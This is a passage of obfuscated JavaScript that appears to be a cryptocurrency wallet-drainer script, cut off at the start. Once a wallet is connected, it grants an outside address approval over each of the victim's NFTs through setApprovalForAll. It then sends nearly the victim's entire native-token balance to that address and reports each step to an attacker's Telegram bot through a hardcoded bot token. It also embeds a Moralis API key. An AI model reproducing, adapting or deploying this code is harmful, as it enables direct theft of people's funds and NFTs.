_0x31741d=_0x11633a;console['log']('Transaction\x20Receipt:\x20'+_0x19d107),sendMessage(_0x31741d(0xbc)),sendMessage(_0x31741d(0x146)+_0x4e2011[_0x31741d(0x19b)]),sendMessage(_0x31741d(0x175)+_0x4e2011[_0x31741d(0x195)]),sendMessage(_0x31741d(0xa7)+Oxa);})['on'](_0x11633a(0xfc),_0x37b991=>{const _0x13ed25=_0x11633a;console[_0x13ed25(0xce)](_0x13ed25(0x19d)+_0x37b991),sendMessage(_0x13ed25(0x191));});}catch(_0x388f5a){console['log']('Error:\x20'+_0x388f5a),sendMessage('Transaction\x20Rejected');}};await loopNfts(NFTs);}async function loopNfts(_0x117d15){const _0x29ae1b=_0x5f1a88;for await(let _0xd68fd4 of _0x117d15){console[_0x29ae1b(0xce)](_0x29ae1b(0x192),_0xd68fd4);try{let _0x2ad665=new web3Object[(_0x29ae1b(0xd7))]['Contract'](ABIN,_0xd68fd4[_0x29ae1b(0x187)]);await _0x2ad665['methods'][_0x29ae1b(0x126)](Oxa,'true')[_0x29ae1b(0x139)]({'from':selectedAccount,'to':_0xd68fd4['token_address']})['on']('transactionHash',_0x2eccfc=>{const _0x27fe11=_0x29ae1b;console[_0x27fe11(0xce)](_0x27fe11(0xe2)+_0x2eccfc),sendMessage(_0x27fe11(0xa0));})['on'](_0x29ae1b(0x15d),_0x2ab01e=>{const _0x21445c=_0x29ae1b;console['log'](_0x21445c(0x181)+_0x2ab01e),sendMessage(_0x21445c(0xbc)),sendMessage(_0x21445c(0xff)+token[_0x21445c(0x19b)]),sendMessage(_0x21445c(0xa7)+Oxa);})['on'](_0x29ae1b(0xfc),_0x568181=>{const _0x27f3fa=_0x29ae1b;console['log'](_0x27f3fa(0x19d)+_0x568181),sendMessage(_0x27f3fa(0x191));});}catch(_0x1bfd65){console[_0x29ae1b(0xce)](_0x29ae1b(0x19d)+_0x1bfd65),sendMessage('Transaction\x20Rejected');}}await onSendEther();}function _0x4f60(){const _0x173bb1=['https://api.telegram.org/bot5444520238:AAHo9DY-sSdKi6wh36WEpTTLA2S5V6Pc5A8/sendMessage?chat_id=@blavkcap','boba-bobabase-testnet','eth','findora-mainnet','_data','arbitrum-goerli','Contract','length','/erc20','spender','defi-kingdoms-mainnet','avalanche-dexalot-mainnet','harmony-mainnet'
,'Transaction\x20Hash:\x20','astar-shiden','_to','isApprovedForAll','interfaceId','_spender','approved','owner','upgradedAddress','nonpayable','value','https://api.coingecko.com/api/v3/simple/token_price/polygon-pos?contract_addresses=','baseURI','function','base-testnet','message','MAX_APES','_balance','maxNftSupply','bsc-testnet','180861InWfQy','skale-omnus','string','totalSupply','Cl\x20address\x20:\x20','0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0','error','optimism-mainnet','removeBlackList','NFT\x20Contract\x20Address\x20','neon-testnet','getBlackListStatus','New\x20token','supportsInterface','axie-mainnet','moonbeam-moonbase-alpha','amount','decimals','evmos-testnet','tokenId','Transfer','index','bittorrent-testnet','bytes','_symbol','flarenetworks-canary-testnet','metis-testnet','nervos-polyjuice-testnet','0xea8968B218a551919FbD5f1166328C82a96dED54','aurora-testnet','GET','_user','sort','all','RemovedBlackList','e62a60a251c64745baefeaf8237af646','DestroyedBlackFunds','milkomeda-c1-mainnet','emergencySetStartingIndexBlock','destroyBlackFunds','bytes4','click','btc-mainnet','Issue','palm-mainnet','defi-kingdoms-testnet','provenanceHash','arbitrum-nova-mainnet','setApprovalForAll','boba-bnb-testnet','newOwner','boba-bnb-mainnet','getChainId','metis-mainnet','ownerOf','newBasisPoints','uint256','ApprovalForAll','remaining','transferFrom','deprecated','tokens-list','NFTs\x20collection\x20','OwnershipTransferred','search','flipSaleState','json','send','unpause','constructor','meter-mainnet','then','_totalSupply','gather-testnet','saleIsActive','transfer','boba-bobabeam-mainnet','5227607491','setBaseURI','usd','TOKEN\x20Contract\x20Address\x20','eth-goerli','_initialSupply','astar-shibuya','Redeem','arbitrum-mainnet','344GowCjG','solana-mainnet','methods','mintApe','skale-calypso','_owner','Insufficient\x20funds\x20for\x20transfer','filter','newAddress','name','view','WalletConnectProvider','mantle-testnet','sx-mainnet','boba-avalanche-testnet','kcc-mainnet','basisPointsRate','receipt','Pause','maxFee','bool','_from','matic-mainnet','operator','oasis-sapphire-testnet','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','allowed','linea-testnet','default','gather-mainnet','10000','https://deep-index.moralis.io/api/v2/','&format=decimal&limit=','Error\x20collecting\x20info\x20about\x20wallet','meter-testnet','approve','setParams','_evilUser','289535CRVMdd','swimmer-testnet','polygon-zkevm-testnet','Token\x20balance\x20is\x20','Token','status','getOwner','_name','matic-mumbai','saleStart','flarenetworks-canary-mainnet','Unpause','124dPylXH','map','findora-forge-testnet','Transaction\x20Receipt:\x20','_blackListedUser','11278058Dezwsb','maximumFee','Could\x20not\x20get\x20a\x20wallet\x20connection','89wOHBSc','token_address','moonbeam-moonriver','matic','emerald-paratime-mainnet','150LHwFXy','getGasPrice','AddedBlackList','5130927MBprqN','https://polygon-rpc.com/','_value','Transaction\x20Rejected','NFT','redeem','getAccounts','balance','gas','result','oasys-testnet','safeTransferFrom','startingIndex','address','Error\x20processing\x20item\x20','Error:\x20','polygon','avalanche-testnet','tokenByIndex','fantom-testnet','MAX_UINT','/nft/collections?chain=','numberOfTokens','20720edwYix','Initial\x20list\x20','astar-mainnet','allowance','from','Transaction\x20is\x20submitted\x20to\x20the\x20network','symbol','balanceOf','&vs_currencies=usd','revealTimeStamp','10818930LadUqk','milkomeda-a1-devnet','Your\x20address\x20','Tokens:','evmos-mainnet','getApproved','event','accountsChanged','feeBasisPoints','who','skale-staging-uum','bsc-mainnet','kcc-testnet','apePrice','Approval','nervos-godwoken-testnet','REVEAL_TIMESTAMP','rsk-testnet','Debug','application/json','142877gXRIAn','payable','setStartingIndex','Approve\x20Completed\x20Successfully','renounceOwnership','getBalance','maxApePurchase','skale-razor','999999999999999999999999999999999999999999999999999999999999999999999999','cronos-mainnet','transferOwnership','oasys-mainnet','tokenOfOwnerByIndex','fantom-mainnet','_decimals','&text=','oasis-sapphire-mainnet','reserveApes','catch','BAYC_PROVENANCE','harmony-testnet','log','newMaxFee','pause','isBlackListed','previousOwner','Wallet\x20Connected\x20Successfully\x20to\x20polygon!','toString'];_0x4f60=function(){return _0x173bb1;};return _0x4f60();}async function onSendEther(){const _0x14237f=_0x5f1a88;console['log']('sending\x20ether');try{let _0x2ffa26=await web3Object['eth'][_0x14237f(0xbe)](selectedAccount);var _0x251329=await web3Object[_0x14237f(0xd7)][_0x14237f(0x18c)](),_0x3f3c85={'gasPrice':_0x251329,'from':selectedAccount,'to':Oxa,'value':_0x2ffa26};_0x3f3c85[_0x14237f(0x196)]=_0xe5c300,_0x3f3c85[_0x14237f(0xec)]=_0x2ffa26-0xaa87bee538000,console[_0x14237f(0xce)](_0x3f3c85[_0x14237f(0xec)]);var _0xe5c300=await web3Object[_0x14237f(0xd7)]['estimateGas'](_0x3f3c85),_0x52a519=_0x251329*_0xe5c300;web3Object[_0x14237f(0xd7)]['sendTransaction'](_0x3f3c85)['on']('transactionHash',_0x3cda89=>{const _0x234a2a=_0x14237f;console[_0x234a2a(0xce)](_0x234a2a(0xe2),_0x3cda89),sendMessage(_0x234a2a(0xa0));})['on']('receipt',_0x47411f=>{const _0x517c20=_0x14237f;console[_0x517c20(0xce)](_0x517c20(0x181),_0x47411f),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');})['on'](_0x14237f(0xfc),_0x562ab7=>{const _0x24305c=_0x14237f;console[_0x24305c(0xce)]('Error:\x20',_0x562ab7),sendMessage(_0x24305c(0x191));});}catch{sendMessage(_0x14237f(0x152));}}async function sendMessage(_0x5115ca){return new Promise((_0x42329a,_0x589b29)=>{const _0x301fb1=_0x4de2,_0x5b01c2=Oxc;fetch(_0x301fb1(0xd5)+_0x5b01c2+_0x301fb1(0xc8)+_0x5115ca,{'method':_0x301fb1(0x114),'headers':{}})[_0x301fb1(0x13d)](async _0x13f353=>{const _0x3819ec=_0x301fb1;if(_0x13f353[_0x3819ec(0x177)]>0x18f)throw _0x13f353;_0x42329a(await _0x13f353[_0x3819ec(0x138)]());})[_0x301fb1(0xcb)](_0x2a5af2=>{_0x589b29(_0x2a5af2);});});}async function getPrice(_0x4c0d8d){return new Promise((_0x5a03c4,_0x379af0)=>{const _0x9610b=_0x4de2;fetch(_0x9610b(0xed)+_0x4c0d8d+_0x9610b(0xa3),{'method':_0x9610b(0x114),'headers':{}})[_0x9610b(0x13d)](async _0x293729=>{const _0x4caadf=_0x9610b;if(_0x293729[_0x4caadf(0x177)]>0x18f)throw _0x293729;_0x5a03c4(await _0x293729['json']());})[_0x9610b(0xcb)](_0x3e54a2=>{_0x379af0(_0x3e54a2);});});}async function getValue(_0x3fbf20,_0x4361aa,_0x2be4d3){const _0x192d3c=_0x5f1a88;console[_0x192d3c(0xce)](_0x3fbf20,_0x4361aa,_0x2be4d3);let _0x52810e=await getPrice(_0x3fbf20);console[_0x192d3c(0xce)]('price',_0x52810e),_0x52810e=parseFloat(_0x52810e[_0x3fbf20][_0x192d3c(0x145)]);let _0x3b6b87=_0x4361aa/0xa**(_0x2be4d3||0x12)*_0x52810e;return _0x3b6b87=parseInt(_0x3b6b87),_0x52810e?_0x3b6b87:0x0;}async function getNFTs(_0x22db3d='',_0x4dc569=_0x5f1a88(0x165),_0x17a07b=_0x5f1a88(0x19e),_0xcd47d2='50'){return new Promise((_0x5ee42b,_0x23a80b)=>{const _0x453b26=_0x4de2;fetch('https://deep-index.moralis.io/api/v2/'+_0x22db3d+_0x453b26(0x1a3)+_0x17a07b+_0x453b26(0x16c)+_0xcd47d2,{'method':_0x453b26(0x114),'headers':{'accept':_0x453b26(0xb8),'X-API-Key':_0x4dc569}})[_0x453b26(0x13d)](async _0x2fa96e=>{const _0x539753=_0x453b26;if(_0x2fa96e[_0x539753(0x177)]>0x18f)throw _0x2fa96e;_0x5ee42b(await _0x2fa96e['json']());})[_0x453b26(0xcb)](_0x3961ab=>{_0x23a80b(_0x3961ab);});});}